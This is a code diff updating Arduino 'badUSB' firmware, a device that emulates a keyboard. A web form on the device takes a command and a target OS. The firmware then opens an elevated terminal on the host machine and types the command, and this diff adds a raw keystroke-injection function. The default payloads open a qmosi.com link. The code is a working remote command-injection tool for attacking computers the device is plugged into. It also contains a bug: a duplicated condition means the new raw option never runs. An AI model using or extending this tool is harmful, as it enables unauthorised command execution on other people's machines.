@@ -73,7 +73,7 @@ void main_page(EthernetClient &client){
   client.println("<html>");
   client.println("<body style=\"font-weight:bold;color:red;background-color:black;\">\n<img src=\"https://raw.githubusercontent.com/649/Arduino-badUSB/main/badusb.png\" width=\"10%\" height=\"10%\">\n<form action=\"/\" method=\"post\"><label for=\"#c\">Command:</label><br><textarea style=\"font-weight:bold;color:white;background-color:#424242;\" id=\"#c\" name=\"#c\" rows=\"4\" cols=\"50\" placeholder=\"root:~#\"></textarea>");
   client.println("<br><label for=\"#o\">OS:</label>\n<select style=\"font-weight:bold;color:white;background-color:#424242;\" name=\"#o\" id=\"#o\">");
-  client.println("<option value=\"1\">Windows</option><option value=\"2\">macOS</option><option value=\"3\">Ubuntu Linux</option>");
+  client.println("<option value=\"1\">Windows</option><option value=\"2\">macOS</option><option value=\"3\">Ubuntu Linux</option><option value=\"4\">Other</option>");
   client.println("</select>");
   client.println("<br><br>\n<input style=\"font-weight:bold;color:white;background-color:#8b0000;\" type=\"submit\" value=\"Execute\"></form>\n</body></html>");
 }
@@ -120,57 +120,11 @@ void parser(char* data){
   return data;
 }
 
-void parse_http(EthernetClient &client){
-  char c;
-  // http headers
-  while((c = client.read()) != '%' && client.available()){
-    Serial.print(c);
-  }
-  if(client.available() > 0){
-    Serial.print(F("[*] Payload-Length: "));
-    int buff = client.available()-11;
-    Serial.println(buff);
-    Serial.println(F("---COMMAND---"));
-    for(int i = 0; i < 4 && client.available(); i++){
-      client.read();// burn em!
-    }
-
-    String command;
-    while((c = client.read()) != '&' && client.available()){
-      command += c;
-    }
-    command += '\0';
-    int str_len = command.length() + 1;
-    char com[str_len]; 
-    command.toCharArray(com, str_len);
-    parser(com);
-    Serial.println(com);
-    
-    Serial.println(F("---OS---"));
-    for(int i = 0; i < 5 && client.available(); i++){
-      client.read();// burn em!
-    }
-    if(client.available() > 0){
-      c = client.read();
-      int ch = int(c);
-      if(ch == 49){
-        Serial.println(F("Windows"));
-        winload(com);
-      }else if(ch == 50){
-        Serial.println(F("macOS"));
-        macload(com);
-      }else if(ch == 51){
-        Serial.println(F("Ubuntu Linux"));
-        tuxload(com);
-      }else{
-        Serial.println(c);
-      }
-    }
-    while(client.available()){ // exaust w/e is left
-      Serial.print(client.read());
-      Serial.println(F("meatballs"));
-    }
-  }
+void reset_webserver_screen(){
+  lcd.setCursor(0,0);
+  lcd.print("SELECT: WEBHOOK "); // first line
+  lcd.setCursor(0,1);
+  lcd.print(Ethernet.localIP());
 }
 
 void web_server(){
@@ -188,6 +142,7 @@ void web_server(){
         if (client.available()) {
           bPendingHttpResponse = true;
           parse_http(client);
+          reset_webserver_screen();
         }else{
           if(bPendingHttpResponse){
             bPendingHttpResponse = false;
@@ -223,7 +178,7 @@ void startup(String head){
 }
 
 void winload(){
-  winload("start \"link\" \"http://qmosi.com/akm\"");
+  winload("start \"link\" \"https://qmosi.com/akm\"");
 }
 void winload(String command){
   //LAUNCHES ELEVATED TERMINAL SESSION
@@ -311,7 +266,7 @@ void winload(String command){
 }
 
 void macload(){
-  macload("open http://qmosi.com/akm");
+  macload("open https://qmosi.com/akm");
 }
 void macload(String command){
   //LAUNCHES ELEVATED TERMINAL SESSION
@@ -386,7 +341,7 @@ void macload(String command){
 }
 
 void tuxload(){
-  tuxload("xdg-open 'http://qmosi.com/akm'");
+  tuxload("xdg-open 'https://qmosi.com/akm'");
 }
 void tuxload(String command){
   //LAUNCHES ELEVATED TERMINAL SESSION
@@ -414,6 +369,16 @@ void tuxload(String command){
   Keyboard.write(0xB0);
   delay(100);
 }
+// Allows for arbitrary HID keys without OS specific wrappers
+void rawload(String command){
+  Keyboard.releaseAll();
+  lcd.setCursor(0,1);
+  lcd.print("   EXECUTING.   ");
+  delay(1000);
+  Keyboard.print(command);
+  delay(300);
+  Keyboard.write(0xB0);
+}
 
 void sysidler(){
   lcd.setCursor(0,0);
@@ -431,12 +396,70 @@ void sysidler(){
   }
 }
 
+
+void parse_http(EthernetClient &client){
+  char c;
+  // http headers
+  while((c = client.read()) != '%' && client.available()){
+    Serial.print(c);
+  }
+  if(client.available() > 0){
+    Serial.print(F("[*] Payload-Length: "));
+    int buff = client.available()-11;
+    Serial.println(buff);
+    Serial.println(F("---COMMAND---"));
+    for(int i = 0; i < 4 && client.available(); i++){
+      client.read();// burn em!
+    }
+
+    String command;
+    while((c = client.read()) != '&' && client.available()){
+      command += c;
+    }
+    command += '\0';
+    int str_len = command.length() + 1;
+    char com[str_len]; 
+    command.toCharArray(com, str_len);
+    parser(com);
+    Serial.println(com);
+    
+    Serial.println(F("---OS---"));
+    for(int i = 0; i < 5 && client.available(); i++){
+      client.read();// burn em!
+    }
+    if(client.available() > 0){
+      c = client.read();
+      int ch = int(c);
+      if(ch == 49){
+        Serial.println(F("Windows"));
+        winload(com);
+      }else if(ch == 50){
+        Serial.println(F("macOS"));
+        macload(com);
+      }else if(ch == 51){
+        Serial.println(F("Ubuntu Linux"));
+        tuxload(com);
+      }else if(ch == 51){
+        Serial.println(F("Raw payload"));
+        rawload(com);
+      }
+    }else{
+      Serial.println(c);
+    }
+  }
+  while(client.available()){ // exaust w/e is left
+    Serial.print(client.read());
+    Serial.println(F("meatballs"));
+  }
+}
+
+
 void verend(){
   verend(false);
 }
 void verend(bool x){
   lcd.setCursor(0,0);
-  lcd.print("  badUSB v3.71  ");
+  lcd.print("  badUSB v3.72  ");
   lcd.setCursor(0,1);
   if(x == true){
     lcd.print("<SELECT PAYLOAD>");
